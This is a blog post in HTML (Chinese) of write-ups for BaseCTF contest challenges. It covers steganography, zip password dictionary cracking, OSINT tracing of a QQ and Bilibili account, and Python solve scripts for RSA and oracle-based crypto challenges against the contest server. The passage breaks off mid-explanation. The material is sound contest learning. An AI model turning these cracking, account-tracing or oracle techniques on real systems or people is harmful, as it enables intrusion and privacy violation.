@@ -1,0 +1,2293 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/xiaoxiauwu.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "XiaoXia",
+    
+    "image": "https://xiaoxiauwu.github.io/images/avatar.jpg"
+    
+  },
+  "name":"夏のBLOG",
+  "description":"Misc [Fin] osc 拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。\n拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。 题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。 可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。\n对左边八个已知字符（\u0026ldquo;BaseCTF{“）分析，结果与猜想均吻合。\n直接上代码，经过适当的参数选取，可以将flag打印地好看一点：\nimport scipy.io.wavfile as wav\rfrom PIL import Image, ImageDraw\rrt, wavsignal = wav.read(\u0027flag.wav\u0027)\r#print(len(wavsignal))#151791\roffset = 10 # y轴偏移矫正\rlength = 151791 \/\/ 20 \/\/ 50 - 51 # 粗略估算每个波的波长\rimage = Image.new(\u0026quot;RGBA\u0026quot;, (1500, 200), (0, 0, 0))\rfor i in range(offset, 151791, length):\rif (i \u002b length - 1) \/\/ length \u0026gt;= 1500: break\rmx = 0\rpadding = int((i \/\/ length) \/ 4.",
+  "url":"https:\/\/xiaoxiauwu.github.io\/post\/ctf\/basectf\/",
+  "keywords":"[tech, C\u002b\u002b, python, study]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.121.2 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="XiaoXia">
+<meta name="keywords" content="tech, C&#43;&#43;, python, study">
+<meta name="description" content="Misc [Fin] osc 拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。
+拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。 题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。 可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。
+对左边八个已知字符（&ldquo;BaseCTF{“）分析，结果与猜想均吻合。
+直接上代码，经过适当的参数选取，可以将flag打印地好看一点：
+import scipy.io.wavfile as wavfrom PIL import Image, ImageDrawrt, wavsignal = wav.read(&#39;flag.wav&#39;)#print(len(wavsignal))#151791offset = 10 # y轴偏移矫正length = 151791 // 20 // 50 - 51 # 粗略估算每个波的波长image = Image.new(&quot;RGBA&quot;, (1500, 200), (0, 0, 0))for i in range(offset, 151791, length):if (i &#43; length - 1) // length &gt;= 1500: breakmx = 0padding = int((i // length) / 4.">
+
+
+<meta property="og:description" content="Misc [Fin] osc 拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。
+拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。 题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。 可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。
+对左边八个已知字符（&ldquo;BaseCTF{“）分析，结果与猜想均吻合。
+直接上代码，经过适当的参数选取，可以将flag打印地好看一点：
+import scipy.io.wavfile as wavfrom PIL import Image, ImageDrawrt, wavsignal = wav.read(&#39;flag.wav&#39;)#print(len(wavsignal))#151791offset = 10 # y轴偏移矫正length = 151791 // 20 // 50 - 51 # 粗略估算每个波的波长image = Image.new(&quot;RGBA&quot;, (1500, 200), (0, 0, 0))for i in range(offset, 151791, length):if (i &#43; length - 1) // length &gt;= 1500: breakmx = 0padding = int((i // length) / 4.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BaseCTF">
+<meta name="twitter:title" content="BaseCTF">
+<meta property="og:url" content="https://xiaoxiauwu.github.io/post/ctf/basectf/">
+<meta property="twitter:url" content="https://xiaoxiauwu.github.io/post/ctf/basectf/">
+<meta property="og:site_name" content="夏のBLOG">
+<meta property="og:description" content="Misc [Fin] osc 拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。
+拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。 题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。 可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。
+对左边八个已知字符（&ldquo;BaseCTF{“）分析，结果与猜想均吻合。
+直接上代码，经过适当的参数选取，可以将flag打印地好看一点：
+import scipy.io.wavfile as wavfrom PIL import Image, ImageDrawrt, wavsignal = wav.read(&#39;flag.wav&#39;)#print(len(wavsignal))#151791offset = 10 # y轴偏移矫正length = 151791 // 20 // 50 - 51 # 粗略估算每个波的波长image = Image.new(&quot;RGBA&quot;, (1500, 200), (0, 0, 0))for i in range(offset, 151791, length):if (i &#43; length - 1) // length &gt;= 1500: breakmx = 0padding = int((i // length) / 4.">
+<meta name="twitter:description" content="Misc [Fin] osc 拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。
+拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。 题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。 可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。
+对左边八个已知字符（&ldquo;BaseCTF{“）分析，结果与猜想均吻合。
+直接上代码，经过适当的参数选取，可以将flag打印地好看一点：
+import scipy.io.wavfile as wavfrom PIL import Image, ImageDrawrt, wavsignal = wav.read(&#39;flag.wav&#39;)#print(len(wavsignal))#151791offset = 10 # y轴偏移矫正length = 151791 // 20 // 50 - 51 # 粗略估算每个波的波长image = Image.new(&quot;RGBA&quot;, (1500, 200), (0, 0, 0))for i in range(offset, 151791, length):if (i &#43; length - 1) // length &gt;= 1500: breakmx = 0padding = int((i // length) / 4.">
+<meta property="og:locale" content="en-us">
+
+  
+    <meta property="article:published_time" content="2024-09-12T03:38:25">
+  
+  
+    <meta property="article:modified_time" content="2024-09-12T03:38:25">
+  
+  
+  
+    
+      <meta property="article:section" content="category">
+    
+      <meta property="article:section" content="subcategory">
+    
+  
+  
+    
+      <meta property="article:tag" content="tag1">
+    
+      <meta property="article:tag" content="tag2">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://xiaoxiauwu.github.io/images/avatar.jpg">
+  <meta property="twitter:image" content="https://xiaoxiauwu.github.io/images/avatar.jpg">
+
+
+
+
+  <meta property="og:image" content="https://xiaoxiauwu.github.io/images/cover.jpg">
+  <meta property="twitter:image" content="https://xiaoxiauwu.github.io/images/cover.jpg">
+
+
+  <meta property="og:image" content="https://xiaoxiauwu.github.io/images/cover.jpg">
+  <meta property="twitter:image" content="https://xiaoxiauwu.github.io/images/cover.jpg">
+
+
+    <title>BaseCTF</title>
+
+    <link rel="icon" href="https://xiaoxiauwu.github.io/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://xiaoxiauwu.github.io/post/ctf/basectf/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://xiaoxiauwu.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://xiaoxiauwu.github.io/css/codeblock.css">
+      
+    
+
+    
+      
+    
+    
+
+
+<script src="https://pagead2.googlesyndication.com/pagead/managed/js/adsense/m202401110101/show_ads_impl_fy2021.js" id="google_shimpl"></script>
+<script>
+      MathJax = {
+         tex: {
+            inlineMath: [['$','$'], ['\\(','\\)']],
+            processEscapes: true,
+            tags: 'ams',
+         },
+      };
+   </script>
+<script type="text/javascript" async="" src="https://wuli.wiki/MathJax3/es5/tex-mml-chtml.js"></script>
+
+<script async src="https://xiaoxiauwu.github.io/js/busuanzi.pure.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade"></head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://xiaoxiauwu.github.io/" aria-label="Go to homepage">夏のBLOG</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://xiaoxiauwu.github.io/#about" aria-label="Open the link: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://xiaoxiauwu.github.io/images/avatar.jpg" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+
+
+<div  class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+</div>
+
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://xiaoxiauwu.github.io/#about" aria-label="Read more about the author">
+          <img class="sidebar-profile-picture" src="https://xiaoxiauwu.github.io/images/avatar.jpg" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">XiaoXia</h4>
+        
+          <h5 class="sidebar-profile-bio">憧憬着未来却虚度着当下，到头来自己也只是一片空虚吧<strong>LIVE IN THE MOMENT</strong></h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://xiaoxiauwu.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://xiaoxiauwu.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://xiaoxiauwu.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://xiaoxiauwu.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://xiaoxiauwu.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Xiaoxiauwu" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-github" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.totorocatcat.top" target="_blank" rel="noopener" title="Totoroの小窝">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-link" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Totoroの小窝</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/cover.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      BaseCTF
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2024-09-12T03:38:25&#43;08:00">
+        
+  September 12, 2024
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://xiaoxiauwu.github.io/categories/category">category</a>, 
+    
+      <a class="category-link" href="https://xiaoxiauwu.github.io/categories/subcategory">subcategory</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" id="top">
+          
+            <span class="post-header-cover-caption caption">文章cover图片描述</span>
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="misc">Misc</h1>
+<h2 id="fin-osc">[Fin] osc</h2>
+<p>拿到附件后打开是个wav文件，文件头文件尾经检查均正常，没有附加额外信息。</p>
+<p>拖到Audacity里查看频谱图，可以隐约的看到“CTF”三个字母，推测这个就是flag。
+<a href="https://imgse.com/i/pAmbSI0"><img src="https://s21.ax1x.com/2024/09/11/pAmbSI0.png" alt="pAmbSI0.png"></a></p>
+<p>题目是osc（示波器），解题关键应该和波形有关，放大查看构成字符“F”的波形。
+<a href="https://imgse.com/i/pAmHXrj"><img src="https://s21.ax1x.com/2024/09/11/pAmHXrj.png" alt="pAmHXrj.png"></a></p>
+<p>可以观察到波谷呈从“|”到“:”的变化（只看每个周期的前半段最低处），正好对应字符“F”从左向右用一个竖线扫描时，扫出的图案。推测字符是由每个波的前半个周期，波谷处形成的。</p>
+<p>对左边八个已知字符（&ldquo;BaseCTF{“）分析，结果与猜想均吻合。</p>
+<p>直接上代码，经过适当的参数选取，可以将flag打印地好看一点：</p>
+<pre><code class="language-python">import scipy.io.wavfile as wav
+from PIL import Image, ImageDraw
+
+rt, wavsignal = wav.read('flag.wav')
+#print(len(wavsignal))#151791
+offset = 10    #    y轴偏移矫正
+length = 151791 // 20 // 50 - 51   #   粗略估算每个波的波长
+
+image = Image.new(&quot;RGBA&quot;, (1500, 200), (0, 0, 0))
+
+for i in range(offset, 151791, length):
+    if (i + length - 1) // length &gt;= 1500: break
+    mx = 0
+    padding = int((i // length) / 4.4)      #图像矫正
+    subwav = wavsignal[i + padding : i + length + padding]
+    for x, y in subwav:     #找到区间最大值（其实是可以公式推算的，斜线斜率可测，但我懒得算，能跑出图就算胜利）
+        mx = max(mx, y)
+    for j in range(len(subwav)):
+        y = mx - subwav[j][1]
+        c = min(255, int(255 * (max(0, y) / (2 * mx + 1))))     #用该点y值距区间最大值的距离计算亮度
+        L = len(subwav)
+        image.putpixel(((i + L - 1) // L, j * 200 // L), (0, c, 0))
+
+image.show()
+# image.save('flag！！！.png')
+</code></pre>
+<p>打印图片如下，还算清晰：
+<a href="https://imgse.com/i/pAmHjqs"><img src="https://s21.ax1x.com/2024/09/11/pAmHjqs.png" alt="pAmHjqs.png"></a></p>
+<h2 id="week2-二维码1-街头小广告">[Week2] 二维码1-街头小广告</h2>
+<p>水题，直接靠二维码强大的纠错能力，补全二维码后扫描（但是注意别用微信/QQ自带扫描，会自动跳转，损失掉二维码的信息）</p>
+<h2 id="week2-反方向的雪">[Week2] 反方向的雪</h2>
+<p>将压缩包中的图片拖到minihex中检查，发现文件尾有异常，看着像逐字节反转的zip。用工具处理出隐藏的zip。</p>
+<p><img src="image.png" alt="alt text"></p>
+<p>尝试打开，发现需要密码，题目说压缩包密码是6尾，而且根据注释“The_key_is_n0secr3t”可知，密码应该很简单，在字典中能查到。用Archive Password Recovery选字典模式爆破，爆出密码是123456。</p>
+<p><img src="image-1.png" alt="alt text"></p>
+<p>解压后打开flag.txt，看起来是空的，但是全选后能看到似乎隐藏了一些空白字符。</p>
+<p><img src="image-2.png" alt="alt text"></p>
+<p><img src="image-3.png" alt="alt text"></p>
+<p>由题目关键词“雪”可知，这应该是snow隐写，找snow.exe，密钥用n0secr3t试试，得到flag：</p>
+<p><img src="image-4.png" alt="alt text"></p>
+<h2 id="week2-海上又遇了鲨鱼">[Week2] 海上又遇了鲨鱼</h2>
+<p>打开题目附件，是个wireshark流量包，打开流量，分析后可以知道是有人在爆破密码，然后下载了flag.zip。</p>
+<p><img src="image-5.png" alt="alt text"></p>
+<p>提取flag.zip后，发现需要密码，根据压缩包注释“repeat password”，猜测密码和爆破出来的账号的密码是一样的，回到流量包可以找到这条记录，输入密码后即可取得flag：</p>
+<p><img src="image-6.png" alt="alt text"></p>
+<h2 id="week3-白丝上的flag">[Week3] 白丝上的flag</h2>
+<p>打开附件，可以看到一个python加密脚本，一个原图，一个加密后的图。</p>
+<p>分析加密脚本逻辑如下：</p>
+<pre><code>选取(1, 1)的alpha值作为初始iv，然后遍历每个像素进行如下更新：
+
+r_ &lt;- g
+g_ &lt;- b
+b_ &lt;- a
+a_ += r + g + b + iv
+iv += g + b + a
+
+(r, g, b, a, iv均在模 256 意义下更新)
+</code></pre>
+<p>那么可以写出解密流程如下：</p>
+<pre><code>倒着遍历每个像素进行如下更新：
+r -&gt; g_
+g -&gt; b_
+b -&gt; a_
+a - iv =&gt; r_
+iv -= r + g + b
+</code></pre>
+<p>iv值不知道？好像不影响解密。</p>
+<p>exp如下：</p>
+<pre><code class="language-python">from PIL import Image
+from random import randint
+import sys
+
+iv = 0
+def rez_add(r, g, b, a):#r &lt;= g, g &lt;= b, b &lt;= a，a += r + g + b + iv, iv += g + b + a
+    global iv
+    g_ = r
+    b_ = g
+    a_ = b
+    r_ = a - iv
+    iv -= r + g + b
+
+    r_ = (r_ + 256 * 3) % 256
+    iv = (iv + 256 * 3) % 256
+    return r_, g_, b_, a_
+
+def rconfuse(data):
+    r,g,b,a = data
+    for _ in range(8):#加8次
+        r,g,b,a = rez_add(r,g,b,a)
+    return r,g,b,a
+
+def rconfuse_image(flag):
+    #global iv
+    #iv = 0#flag.getpixel((1,1))[0]
+    
+    img = Image.new('RGBA', (flag.width, flag.height))
+    for w in range(img.width - 1, -1, -1):
+        for h in range(img.height - 1, -1, -1):
+            img.putpixel((w, h), rconfuse(flag.getpixel((w,h))))
+    return img
+
+if __name__ == '__main__':
+    #global iv
+    iv = 0
+    for i in range(256):
+        #global iv
+        iv = i
+        print(&quot;processing &quot; + str(i) + &quot;...&quot;)
+        flag = Image.open(&quot;en_image.png&quot;)
+        img = rconfuse_image(flag)
+        img.save(&quot;de_image&quot;+str(i)+&quot;.png&quot;)
+
+</code></pre>
+<p><img src="image-7.png" alt="alt text"></p>
+<h2 id="week3-纯鹿人">[Week3] 纯鹿人</h2>
+<p>附件是个docx文件，移开图片，可以看到图片后隐藏着一段文字，是base64编码，解密出“password：ikunikun”，似乎是压缩包密码</p>
+<p><img src="image-8.png" alt="alt text"></p>
+<p>猜测压缩包可能藏在图片中，把docx后缀改成zip，无损提取出图片，分割出zip，然后解压即可拿到flag</p>
+<h2 id="week4-二维码2-阿喀琉斯之踵">[Week4] 二维码2-阿喀琉斯之踵</h2>
+<p>打开附件，有两张二维码图片，其中hint似乎想表明，原二维码有些地方被涂黑了。</p>
+<p>直接打开画图工具擦掉hint被标记的地方。并且要注意到一个事实：在二维码中，左下角的右上方有一个像素一定是黑的，把这个地方涂黑。就可以扫出flag（有点难扫出来，可以把图片缩小一点扫）
+<img src="image-10.png" alt="alt text">
+<img src="image-9.png" alt="alt text"></p>
+<h2 id="week4-小cheny的社交">[Week4] 小cheny的社交</h2>
+<p><em>开盒能力锻炼题？</em></p>
+<p>打开图片，拖入Minihex检查，无附加信息。用Stegsolve.jar打开图像，在Alpha plane 1发现密文：
+<img src="image-11.png" alt="alt text">
+是Base64编码，用cyberchef一键解密，发现一串很像二进制数的东西
+<img src="image-12.png" alt="alt text">
+再作为bin解密一次，得到一串数字
+<img src="image-13.png" alt="alt text"></p>
+<p>结合题意猜测，这个应该是社交账号，作为QQ号试试，发现确实可以搜到一个半星小号：</p>
+<p><img src="image-14.png" alt="alt text">
+<img src="image-15.png" alt="alt text"></p>
+<p>在空间中发现了一个b站视频链接，以及一个意义不明的字符串，为“真嘟假嘟语”，上网查找相关翻译器翻译（我用的是<a href="https://zdjd.vercel.app/">https://zdjd.vercel.app/</a>）：</p>
+<p><img src="image-16.png" alt="alt text"></p>
+<p>只有半个flag，推测剩下一半要去b站那边找，在b站简介中发现了cheny师傅（和题目cheny相对应），进其主页，查看动态，可以看到7月19号有一条意义不明的动态，日期正好和题目放出来的时间差不多</p>
+<p><img src="image-17.png" alt="alt text">
+<img src="image-18.png" alt="alt text"></p>
+<p>观察后不难发现，这实际上就是一个网址，按奇偶分成了两个字符串，数据量不大，手动复原后可以发现其是个个人blog，在主页可以看到一篇7月19发布的文章，内容还是熟悉的“尊嘟假嘟语”</p>
+<p><img src="image-19.png" alt="alt text"></p>
+<p>再次用翻译器即可获取剩下一半flag：</p>
+<p><img src="image-20.png" alt="alt text"></p>
+<p><em>好绕</em></p>
+<h1 id="crypto">Crypto</h1>
+<h2 id="fin-の歪来">[Fin] の歪来</h2>
+<p>打开附件，是个py加密脚本：</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from gmpy2 import *
+
+flag=b''
+assert len(flag)==28
+m=bytes_to_long(flag)
+
+n=getPrime(2048)
+e=32
+
+c=pow(m,e,n)
+
+
+print(&quot;n =&quot;,n)
+print(&quot;e =&quot;,e)
+print(&quot;c =&quot;,c)
+</code></pre>
+<p>代码十分短，注意到e特别小，而且是2的幂次。考虑对密文进行五次开方，枚举32个可能解，即可找到flag</p>
+<p>exp如下:</p>
+<pre><code class="language-python">from random import *
+from Crypto.Util.number import *
+from gmpy2 import *
+ 
+def legendre(a, p):
+    symbol = pow(a, (p - 1) // 2, p)
+    if symbol == p - 1:
+        return -1
+    return symbol
+
+def tonelli(a, p):                      #Tonelli
+    if a == 0 or legendre(a, p) != 1:
+        return 0
+    q = p - 1
+    s = 0
+    while q % 2 == 0:
+        q //= 2
+        s += 1
+    if s == 1:
+        return pow(a, (p + 1) // 4, p)
+ 
+    z = 2
+    while legendre(z, p) != -1:
+        z += 1
+ 
+    m = s
+    c = pow(z, q, p)
+    t = pow(a, q, p)
+    r = pow(a, (q + 1) // 2, p)
+ 
+    while t != 1:
+        t2 = t
+        i = 0
+        while t2 != 1 and i &lt; m:
+            t2 = pow(t2, 2, p)
+            i += 1
+        b = pow(c, 2 ** (m - i - 1), p)
+        m = i
+        c = (b * b) % p
+        t = (t * c) % p
+        r = (r * b) % p
+ 
+    return r
+
+#x^2=c mod p
+def Cipolla_algorithm(c,p):          #Cipolla
+    # 定义模p复数域上的乘法
+    def multiplication(x1,y1,x2,y2,w,p):
+        x=(x1*x2+y1*y2*w)%p
+        y=(x1*y2+x2*y1)%p
+        return x,y
+ 
+    # 获取w,使得w=-1mod(p),w是复数元的平方
+    def get_w(c,p):
+        a=randint(1,p)
+        w=pow(a, 2) - c
+        while pow(w,(p - 1)//2,p)!=p-1:
+            a=randint(1,p)
+            w=pow(a,2)-c
+        return w,a
+    #主体部分
+    w,a=get_w(c,p)
+    power=(p+1)//2
+    x1=a
+    y1=1
+    x=1
+    y=0
+ 
+    while(power!=0):
+        if(power!=(p+1)//2):
+            x1,y1=multiplication(x1,y1,x1,y1,w,p)
+        if(power &amp; 1):
+            x,y=multiplication(x,y,x1,y1,w,p)
+        power&gt;&gt;=1
+    return x
+
+n = 17363249226879909675667629533972233798566313669420563155296918020175446973456428454735263489044575257132690882883587342817653451483222705760704890265900885255972067349104579938808591608382992680533327518070878297438339884996059309549300942570104747348751766711833983705979880714174709047335147739991850385244159235504375559144283494800573079055547597410783559965162216203307100248001158445665271438067670522510991047688414176659907164436539491205637933681658814267567385232097679554282863595183422504494357205180093828786415060565003183966959273253039416986816444073158723191290806413175478175738266995214965220231649
+e = 32
+c = 6840453756562205147103219479843999687625029691496635689045074720240615321966887831642035124198445485320265097191334720798522097422084141332044111764558336174743819347952914775206809737198058220362381349481027893609144697054465070779290329222696236671374412706789862193871687821041053566873553189148668599841084370137084893575567622972476409755187388121177923217208552049876944055745912987536390075417261016809335539362984984190264791744790640858201038207982043569204062714722892105134794280417020318408200038144689432974312283915592134911446185412636709207566063730723406969727969141426530341540330398465744403597273
+
+ss = set()
+ss.add(c)
+for i in range(5):
+    ss_ = set()
+    for j in ss:
+        s = set()
+        while len(s) != 2:# 保证开方出来的两个结果均被记录
+            s.add(Cipolla_algorithm(j, n))
+        for k in s:
+            ss_.add(k)
+    ss = ss_
+    print(str(i + 1) + &quot;轮结束&quot;)
+print(len(ss))
+for i in ss:#   枚举全部32个解
+    m = long_to_bytes(i)
+    print(m)
+</code></pre>
+<p><img src="image-21.png" alt="alt text"></p>
+<h2 id="fin-猜猜看">[Fin] 猜猜看</h2>
+<p>分析题目给的py脚本可知服务端的核心逻辑如下：</p>
+<pre><code class="language-python">def handle(self):
+    assert len(flag)==45
+    self.send(b&quot;hello.&quot;)
+
+    m=bytes_to_long(flag)
+    m=bin(m)[2:]
+
+    length=len(m)
+
+    x=np.array([int(i) for i in m])
+    T=np.array([[random.getrandbits(1) for _ in range(length)] for __ in range(length)])
+
+    y=np.dot(x,T)
+    self.send(str(list(y)).encode())
+
+    while True:
+        user_input=ast.literal_eval(self.recv().strip().decode('utf-8'))
+        if isinstance(user_input,list):
+            try:
+                mat=np.array(user_input)
+                res=list(np.dot(mat,T))
+                self.send(str(res).encode())
+            except:
+                self.send(b'wrong!!')
+        else:
+            self.send(b'wrong!')
+            break
+    
+
+    self.send(b&quot;\nConnection has been closed  =.=  &quot;)
+    self.request.close()
+</code></pre>
+<p>服务端将flag的二进制按位填入一个长度为flag二进制位数(n)的向量x里，然后随机生成了一个n*n的加密矩阵T，右乘向量x加密，并返回加密后的向量y</p>
+<p>接着从客户端接收一个长度也为n的向量，左乘加密矩阵T，并返回结果。</p>
+<p>显然，我们可以构造 $[1,0,0,\cdots,0], [0,1,0,\cdots,0],\cdots,[0,0,0,\cdots,1]$来依次获取加密矩阵T的每一行，exp如下：</p>
+<pre><code class="language-python">from pwn import *
+from Crypto.Util.number import *
+
+import socketserver
+import numpy as np
+import random
+import ast
+import os
+
+host = remote('challenge.basectf.fun', 30493)
+y = []
+T = []
+
+def recv():
+    y = &quot;&quot;
+    while y.find(&quot;]&quot;) == -1:
+        y += host.recv().decode()
+    return y
+
+print(host.recv().decode())
+y = eval(recv())
+print(&quot;recving...&quot;)
+
+empty = [0 for i in range(359)]
+for i in range(359):
+    empty[i] = 1
+    host.send(str(empty).encode())
+    empty[i] = 0
+    
+    b = recv()
+    print(i, len(b.split(&quot;,&quot;)))
+    
+    T.append(eval(b))
+
+T_ = np.linalg.inv(np.array(T))
+res = np.dot(y,T_)
+
+m = 0
+for i in res:
+    m *= 2
+    if i &gt; 1e-10:
+        m += 1
+print(m)
+flag = long_to_bytes(m)
+print(flag)#b'BaseCTF{fe242f9f-36d0-4011-bb6a-600cc84b6730}'
+</code></pre>
+<p><img src="image-22.png" alt="alt text"></p>
+<h2 id="fin-老涩批了">[Fin] 老涩批了</h2>
+<p>分析题目给的py脚本可知服务端的核心逻辑如下：</p>
+<pre><code class="language-python">def handle(self):
+    p=getPrime(256)
+    q=getPrime(256)
+    n=p*q
+    e=65537
+    d=inverse(e,(p-1)*(q-1))
+
+    text=b'BaseCTF{'+str(uuid.uuid4()).encode()+b'}'
+
+    m1=bytes_to_long(text[:len(text)//2])
+    c1=pow(m1,e,n)
+
+    m2=bytes_to_long(text[len(text)//2:])
+    c2=pow(m2,e,n)
+
+    self.send(b'n = '+str(n).encode())
+    self.send(b'e = '+str(e).encode())
+    self.send(b'c1 = '+str(c1).encode())
+    self.send(b'c2 = '+str(c2).encode())
+
+    while True:
+        select=self.recv().strip()
+        if select==b'1':
+            c=int(self.recv().decode().strip())
+            m=pow(c,d,n)
+            res=m&amp;1
+        elif select==b'2':
+            c=int(self.recv().decode().strip())
+            m=pow(c,d,n)
+            res=long_to_bytes(m,64)[0]
+        elif select==b'3':
+            user_text=self.recv().strip()
+            if user_text==text:
+                self.send(flag)
+                break
+            else:
+                self.send(b'try again')
+                break
+        else :
+            self.send(b'wrong')
+            break
+        self.send(str(res).encode())
+    self.send(b&quot;\nConnection has been closed  =.=  &quot;)
+    self.request.close()
+</code></pre>
+<p>大致逻辑：先将随机生成的假flag分割成左右两部分m1，m2，分别用随机生成的p，q进行rsa加密成c1，c2，返回客户端n，e，c1，c2的值。然后应答客户端的三种询问操作：</p>
+<ul>
+<li>询问1将返回询问的密文c解密后的m的奇偶性</li>
+<li>询问2将返回询问的密文c解密后的m，在m前尽可能少地补0，使得m总长度最后为64的倍数，然后返回m的第一个字节</li>
